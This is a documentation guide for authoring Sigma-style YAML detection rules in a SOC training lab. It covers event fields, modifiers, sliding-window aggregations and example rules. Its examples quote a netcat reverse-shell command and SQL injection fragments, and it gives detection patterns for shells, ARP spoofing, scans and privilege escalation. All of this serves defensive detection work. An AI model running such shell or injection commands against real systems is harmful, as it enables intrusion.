# SOC Detection Rule Authoring Guide

## Overview

Cyber Hazard Lab features an enterprise-grade, Sigma-compatible **SOC Detection Engine** (`backend/services/soc_engine.py`). 

The engine ingests real system audits, process execution telemetry, and network protocol packets forwarded by device `SIEM_AGENT` daemons to the central `SIEM_COLLECTOR` (UDP port 514). It evaluates detection rules written in human-readable **YAML format**, tracking sliding-window aggregations, raising prioritized SOC Alerts (`INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`), and dynamically updating device threat postures.

---

## 1. Rule Structure & Schema

A detection rule is a standard YAML document composed of metadata, log source targeting, and a `detection` block:

```yaml
title: Rule Human-Readable Title
id: rule-unique-identifier
status: enabled                # enabled | disabled | testing
severity: HIGH                 # INFO | LOW | MEDIUM | HIGH | CRITICAL
description: Detailed description of the threat behavior and attacker intent.
author: BlueTeam Lead

logsource:
  category: process_creation   # process_creation | network_security | authentication | web_server | network
  product: linux               # linux | arp | ssh | http | icmp

detection:
  selection_main:
    type: 'COMMAND_EXECUTED'
    metadata.command|contains: 'suspicious_tool'
  condition: selection_main
```

### Top-Level Attributes

| Field | Type | Required | Description |
| :--- | :--- | :--- | :--- |
| `title` | `string` | **Yes** | Clear name displayed on alert cards and rule libraries. |
| `id` | `string` | **Yes** | Unique identifier (e.g. `rule-reverse-shell`, `rule-ssh-brute-force`). |
| `status` | `string` | **Yes** | `enabled` (actively matching) or `disabled` (dormant). |
| `severity` | `string` | **Yes** | Alert priority: `INFO`, `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL`. Alerts with `CRITICAL` or `HIGH` mark target devices as **Compromised** or **Suspicious**, triggering visual Error-state rendering. |
| `description` | `string` | **Yes** | Context for SOC analysts explaining why this rule fired. |
| `logsource` | `map` | **Yes** | Classifies target telemetry domain (`category` and `product`). |
| `detection` | `map` | **Yes** | Contains selections, filters, aggregations, and boolean conditions. |

---

## 2. Event Types & Available Fields

The engine evaluates real system and network events emitted during terminal commands, daemons, and packet routing.

### Common Event Types

| Event Type (`type`) | Emitter | Sample Trigger |
| :--- | :--- | :--- |
| `COMMAND_EXECUTED` | Terminal / Shell | Running any shell command (`nc`, `nmap`, `arpspoof`, `cat`) |
| `NETWORK_CONNECTION` | Network Stack | Outbound socket connections, port knocks, raw tunnels |
| `SQL_INJECTION_DETECTED` | HTTP Server | Payloads containing `' OR 1=1`, `UNION SELECT`, `DROP TABLE` |
| `ARP_REPLY` | ARP Engine | Address resolution replies (`metadata.conflict: true` on spoofing) |
| `SSH_AUTH_SUCCESS` | SSH Daemon | Successful authentication to interactive shell |
| `SSH_AUTH_FAILED` | SSH Daemon | Bad password / invalid user credentials |
| `ICMP_ECHO_REQUEST_SENT` | Ping / ICMP | Outbound ICMP echo requests |
| `UDP_DATAGRAM_RECEIVED` | UDP Protocol | Inbound UDP payloads (syslog, DNS, custom probes) |

### Event Field Reference

Any event key can be targeted in rule selections:

- `source`: Source IP address or emitting node hostname.
- `destination`: Target IP address or receiving node hostname.
- `protocol`: Protocol name (`TCP`, `UDP`, `ICMP`, `ARP`, `HTTP`).
- `port`: Transport layer port number (`22`, `53`, `80`, `514`, `4444`).
- `user`: Account executing the action (`root`, `user`, `cfo`, `kali`).
- `metadata.<key>`: Nested metadata properties using dot-notation:
  - `metadata.command`: Full command string (e.g., `nc -e /bin/bash 10.100.0.25 4444`).
  - `metadata.cmd`: Binary/command name (e.g., `nc`).
  - `metadata.args`: List of command line arguments (e.g., `["-e", "/bin/bash"]`).
  - `metadata.conflict`: Boolean flag set to `true` when an ARP cache collision occurs.
  - `metadata.payload`: HTTP request line or raw buffer.
  - `metadata.host`: Target server name.

---

## 3. Field Modifiers

Append modifiers to field keys with the pipe operator (`|`):

| Modifier | Description | Example | Matches |
| :--- | :--- | :--- | :--- |
| `|contains` | Case-insensitive substring match | `metadata.command|contains: 'nc'` | Matches `nc -e /bin/sh`, `ncat` |
| `|contains_all` | All specified substrings must be present | `metadata.command|contains_all: ['-e', 'sh']` | Matches `nc -lvp 4444 -e /bin/sh` |
| `|startswith` | Prefix match | `metadata.command|startswith: 'sudo'` | Matches `sudo su`, `sudo -i` |
| `|endswith` | Suffix match | `destination|endswith: '.50'` | Matches `10.100.10.50` |
| `|in` | Exact match against any item in list | `protocol|in: ['TCP', 'UDP']` | Matches either `TCP` or `UDP` |
| `|regex` | Regular expression pattern | `metadata.command|regex: '(?i)nc\s+.*-e'` | Regex matching command pattern |

---

## 4. Conditions & Boolean Logic

The `condition` string combines your defined selections using boolean logic:

```yaml
detection:
  selection_cmd:
    metadata.command|contains: 'sudo su'
  selection_user:
    user: 'root'
  filter_safe:
    source: '10.100.0.10'
  condition: (selection_cmd or selection_user) and not filter_safe
```

- Operators: `and`, `or`, `not`
- Grouping: Parentheses `(...)` for nested expressions.

---

## 5. Stateful Sliding-Window Aggregations

For attacks that require multiple events over time (such as brute force attempts or reconnaissance sweeps), use the `aggregation` block:

```yaml
detection:
  selection:
    type: 'SSH_AUTH_FAILED'
  aggregation:
    operator: count          # Aggregation function (count)
    threshold: 3             # Number of events required to fire
    timeframe: 60            # Sliding window duration in seconds
    by: destination          # Grouping key (tracks counts per target host)
  condition: selection
```

### Aggregation Attributes

- `operator`: Currently supports `count`.
- `threshold`: Integer count threshold (e.g., `3`, `5`, `10`).
- `timeframe`: Time window in seconds (e.g., `60` for 1 minute).
- `by`: The pivot field. Keeps separate counters per distinct value (`source`, `destination`, `user`).
- `distinct`: Optional. Counts **unique** values of a specified field rather than total events (ideal for multi-host sweeps).

---

## 6. Ready-to-Use Production Examples

### Example 1: Netcat Interactive Reverse Shell
**Threat**: Attacker spawns an interactive shell back to their listening machine.
```yaml
title: Netcat Reverse Shell Execution
id: rule-reverse-shell
status: enabled
severity: CRITICAL
description: Detects interactive command shell spawned over network via Netcat.
logsource:
  category: process_creation
  product: linux
detection:
  selection_cmd:
    metadata.command|contains: 'nc'
  selection_flag:
    metadata.command|contains: '-e'
  selection_shell:
    metadata.command|contains: 'sh'
  condition: selection_cmd and selection_flag and selection_shell
```

---

### Example 2: Web Application SQL Injection
**Threat**: Exploitation of database-backed HTTP endpoints using standard SQLi vectors.
```yaml
title: SQL Injection Attack against Web Portal
id: rule-sql-injection
status: enabled
severity: CRITICAL
description: Detects SQL injection signatures in HTTP requests to corporate web endpoints.
logsource:
  category: web_server
  product: http
detection:
  selection:
    type: 'SQL_INJECTION_DETECTED'
  condition: selection
```

---

### Example 3: ARP Cache Poisoning (Man-in-the-Middle)
**Threat**: Attacker broadcasts malicious ARP replies to redirect traffic through their host.
```yaml
title: ARP Poisoning / Spoofing Activity
id: rule-arp-spoof
status: enabled
severity: CRITICAL
description: Detects ARP poisoning attacks via arpspoof command or conflicting hardware cache updates.
logsource:
  category: network_security
  product: arp
detection:
  selection_cmd:
    metadata.command|contains: 'arpspoof'
  selection_conflict:
    type: 'ARP_REPLY'
    metadata.conflict: true
  condition: selection_cmd or selection_conflict
```

---

### Example 4: SSH Authentication Brute Force
**Threat**: Automated credential guessing targeting SSH servers.
```yaml
title: SSH Brute Force Attack
id: rule-ssh-brute-force
status: enabled
severity: HIGH
description: Detects 3 or more failed SSH authentication attempts within 60 seconds against a host.
logsource:
  category: authentication
  product: ssh
detection:
  selection:
    type: 'SSH_AUTH_FAILED'
  aggregation:
    operator: count
    threshold: 3
    timeframe: 60
    by: destination
  condition: selection
```

---

### Example 5: Network Port Scanning Reconnaissance
**Threat**: Fast TCP/UDP port mapping via tools like Nmap.
```yaml
title: Network Port Scanning Activity
id: rule-port-scan
status: enabled
severity: HIGH
description: Detects port scan reconnaissance tools executed from an endpoint.
logsource:
  category: reconnaissance
  product: network
detection:
  selection_tool:
    metadata.command|contains: 'nmap'
  condition: selection_tool
```

---

### Example 6: ICMP Lateral Movement Sweep
**Threat**: Attacker sweeping the internal subnet with ping to identify live hosts.
```yaml
title: ICMP Reconnaissance Sweep
id: rule-icmp-sweep
status: enabled
severity: MEDIUM
description: Detects a single source sending ICMP echo requests to 4 or more distinct destination IPs within 20 seconds.
logsource:
  category: network
  product: icmp
detection:
  selection:
    type: 'ICMP_ECHO_REQUEST_SENT'
  aggregation:
    operator: count
    distinct: destination
    threshold: 4
    timeframe: 20
    by: source
  condition: selection
```

---

### Example 7: Direct Root Privilege Escalation
**Threat**: Non-root user obtaining an interactive root shell via `sudo su`.
```yaml
title: Direct Root Login / Privilege Escalation
id: rule-root-priv-esc
status: enabled
severity: CRITICAL
description: Detects direct switch to root user or privilege escalation via sudo su.
logsource:
  category: privilege_escalation
  product: linux
detection:
  selection_sudo_su:
    metadata.command|contains: 'sudo su'
  selection_su_root:
    metadata.command: 'su root'
  condition: selection_sudo_su or selection_su_root
```

---

## 7. How to Validate & Deploy Rules

### Method 1: Using the SOC Lab UI
1. Navigate to **`http://localhost:8000/soc`**.
2. Click on the **DETECTION RULES** tab.
3. Select a starter template from the dropdown or write your custom YAML rule in the editor.
4. Click **VALIDATE** to perform an instant schema and syntax check.
5. Click **DEPLOY RULE** to activate the rule in the running detection engine.

### Method 2: Via REST API
- **Validate**:
  ```bash
  curl -X POST http://localhost:8000/api/soc/rules/validate \
       -H "Content-Type: application/json" \
       -d '{"yaml": "<your_yaml_content>"}'
  ```
- **Deploy**:
  ```bash
  curl -X POST http://localhost:8000/api/soc/rules \
       -H "Content-Type: application/json" \
       -d '{"yaml": "<your_yaml_content>"}'
  ```
- **Delete**:
  ```bash
  curl -X DELETE http://localhost:8000/api/soc/rules/rule-custom-id
  ```

---

## 8. Impact on Nodes when Rules Fire
When an alert with `CRITICAL` or `HIGH` severity triggers:
1. An alert record is created with timestamp, severity, evidence event, and host details.
2. The affected host's posture dynamically transitions to **Compromised** (for `CRITICAL`) or **Suspicious** (for `HIGH`).
3. On the **Net.Creator** canvas, compromised nodes automatically switch to their visual red error state (`*_Err.png`) with an animated pulsing red outline, while remaining fully operational for continued simulation.
